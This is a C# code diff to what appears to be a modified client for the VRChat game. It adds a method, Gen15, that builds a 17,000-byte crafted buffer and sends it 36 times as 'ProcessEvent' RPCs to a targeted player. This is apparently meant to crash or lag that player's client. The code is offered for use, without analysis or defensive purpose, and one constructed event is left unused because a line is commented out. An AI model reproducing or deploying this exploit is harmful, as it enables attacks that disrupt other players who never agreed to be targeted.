@@ -2,8 +2,8 @@
 using System.Text;
 using System.Collections.Generic;
 using UnityEngine;
-using VRCSDK2;
 using BlazeIL;
+using VRC.SDKBase;
 using VRC.Core;
 using VRC.UI;
 
@@ -11,6 +11,41 @@ namespace Addons
 {
     public static class UserUtils
     {
+        public static void Gen15(PhotonPlayer player)
+        {
+            byte[] array = new byte[17000];
+            array[0] = 11;
+            array[1] = byte.MaxValue;
+            array[2] = 3;
+            array[3] = 104;
+            for (int i = 4; i < 17000; i++)
+            {
+                array[i] = 0;
+            }
+            for (int j = 0; j < 36; j++)
+            {
+                VRC_EventHandler.VrcEvent vrcEvent = new VRC_EventHandler.VrcEvent
+                {
+                    EventType = VRC_EventHandler.VrcEventType.SendRPC,
+                    ParameterObject = null,
+                    ParameterString = "SetCameraRPC",
+                    ParameterBytes = array,
+                    ParameterBytesVersion = new int?(1),
+                    ParameterInt = 9
+                };
+                VRC_EventLog.VrcEvent vrcEvent2 = new VRC_EventLog.VrcEvent
+                {
+                    // vrcEvent = vrcEvent,
+                    vrcBroadcastType = VRC_EventHandler.VrcBroadcastType.Always,
+                    vrcInt = VRC.Player.Instance.photonPlayer.ID,
+                    vrcLong = 0L,
+                    vrcFloat = 0F,
+                };
+                Photon.Pun.PhotonView.Find(1).RpcSecure("ProcessEvent", player, true, new IntPtr[] {
+                    vrcEvent2.ptr
+                });
+            }
+        }
         #region TeleportTo
         public static void TeleportTo(VRC.Player player) => TeleportTo(player.transform);
         public static void TeleportTo(GameObject gameObject) => TeleportTo(gameObject.transform);
